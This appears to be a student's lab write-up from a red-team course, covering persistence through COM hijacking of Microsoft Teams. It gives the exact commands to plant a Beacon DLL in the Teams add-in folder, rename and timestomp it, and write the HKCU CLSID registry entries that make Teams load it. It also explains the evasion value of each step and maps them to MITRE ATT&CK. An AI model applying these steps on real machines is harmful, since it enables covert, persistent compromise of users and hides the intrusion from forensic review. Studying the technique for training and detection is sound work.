# CRTO — Persistence Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Persistence
**Objective:** Hijack a COM object used by Microsoft Teams to maintain persistence — forcing a trusted, signed Microsoft application to load and run a Beacon DLL

---

## The Full Chain

```
Generate Beacon DLL (http_x64.dll, Exit: Thread)
    ↓
Upload to Teams Meeting Add-in directory (user-writable, trusted path)
    ↓
Rename + timestomp to blend with legitimate DLLs
    ↓
Write HKCU registry entries to hijack COM CLSID {7D096C5F-...}
    ↓
Victim launches Microsoft Teams
    ↓
Teams loads COM object → resolves to our DLL via HKCU hijack
    ↓
Beacon running inside ms-teams.exe
```

---

## Step 1 — Generate a DLL Payload

```
Payloads > Windows Stageless Payload
Listener:      http
Output:        Windows DLL
Exit Function: Thread
Save to:       C:\Payloads\http_x64.dll
```

**Why `Exit Function: Thread` instead of Process:**

| Exit Function | Behaviour | Use When |
|---|---|---|
| `Process` | Kills the host process on Beacon exit | Standalone EXE payloads |
| `Thread` | Exits only the thread, host process lives | DLL injection into a process you don't own |

> Using `Process` here would kill `ms-teams.exe` when Beacon exits — obvious to the victim and destroys your persistence. `Thread` lets Teams keep running normally.

---

## Step 2 — Upload and Stage the DLL

From the Beacon running as `pchilds`:

```bash
# Change to the Teams Meeting Add-in directory
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64

# Upload the DLL
upload C:\Payloads\http_x64.dll

# Rename to blend in with legitimate Teams DLLs
mv http_x64.dll Microsoft.Teams.HttpClient.dll

# Timestomp — copy timestamps from a legitimate DLL in the same directory
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```

**Why this directory:**
- User-writable — no admin required
- Already contains legitimate Microsoft Teams DLLs — our file blends in by name and location
- Teams loads DLLs from this path during startup — natural execution trigger

**Why timestomp:**
- Default uploaded files have a creation/modification timestamp of "now" — sticks out in directory listings and forensic timelines
- Copying timestamps from a legitimate DLL in the same folder makes all files appear to have been installed at the same time
- **MITRE:** T1070.006 — Indicator Removal: Timestomp

---

## Step 3 — COM Hijack via Registry

**TTP:** T1546.015 — Event Triggered Execution: Component Object Model Hijacking

### How COM Hijacking Works

Windows resolves COM objects (CLSIDs) in a specific order:
```
1. HKCU\Software\Classes\CLSID\{CLSID}   ← checked FIRST, user-writable
2. HKLM\Software\Classes\CLSID\{CLSID}   ← system-wide, requires admin
```

If a CLSID entry exists in `HKCU`, Windows loads it **instead of** the system-wide `HKLM` entry — no admin required, no modification of system files.

### Registry Entries

```
# Set the DLL path for the hijacked CLSID
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"

# Set the threading model
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```

**Key fields explained:**

| Field | Value | Purpose |
|---|---|---|
| CLSID | `{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}` | The COM object Teams loads at startup |
| Default value | Path to our DLL | Tells Windows where to load `InprocServer32` from |
| `ThreadingModel` | `Both` | Required for COM servers — `Both` means the object can be called from any thread (STA or MTA). Without this the COM load may fail |
| `REG_EXPAND_SZ` | Used for the path | Allows `%LocalAppData%` environment variable expansion |

> **Why `%LocalAppData%` instead of a hardcoded path:** Environment variables make the registry entry portable across user profiles and survive path changes — more reliable and slightly harder to spot in static analysis.

### Trigger

```
Victim opens Microsoft Teams
    ↓
Teams requests COM object {7D096C5F-...}
    ↓
Windows checks HKCU first → finds our entry
    ↓
Loads Microsoft.Teams.HttpClient.dll from the Add-in directory
    ↓
DLL executes InitializeNewDomain / DllMain → Beacon fires
    ↓
New Beacon appears running inside ms-teams.exe
```

---

## Why This Technique Is Effective

| Property | Detail |
|---|---|
| **No admin required** | HKCU is always user-writable |
| **No system file modification** | Nothing in HKLM or System32 is touched |
| **Trusted process** | Beacon runs inside signed Microsoft binary (`ms-teams.exe`) |
| **Natural trigger** | Teams launches on login for most corporate users — persistence fires automatically |
| **Blends in** | DLL name and location match legitimate Teams files |
| **Survives reboots** | Registry entry persists across sessions |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1546.015 | COM Hijacking | HKCU CLSID override to load malicious DLL |
| T1070.006 | Timestomp | Copy timestamps from legitimate file to blend in |
| T1574.002 | DLL Side-Loading | Malicious DLL loaded by trusted Teams process |
| T1543 | Create/Modify System Process | DLL loaded in context of ms-teams.exe |

---

## Key Takeaways

- COM hijacking via `HKCU` requires **zero admin privileges** — it's one of the cleanest persistence mechanisms available at user level
- Always set `ThreadingModel` — omitting it is a common mistake that causes the COM load to silently fail
- `Exit Function: Thread` is mandatory for any DLL injected into a process you don't control — never use `Process` for persistence DLLs
- Timestomping is a small step but meaningful — it's the difference between a file that stands out in a forensic timeline and one that doesn't
- The CLSID `{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}` is Teams-specific — on real engagements, identify hijackable CLSIDs for whatever applications are present using Process Monitor (filter on `NAME NOT FOUND` + `HKCU` registry access)
- On real engagements, clean up the `HKCU` registry entries after the engagement ends — leaving COM hijacks in place post-engagement violates the *primum non nocere* principle
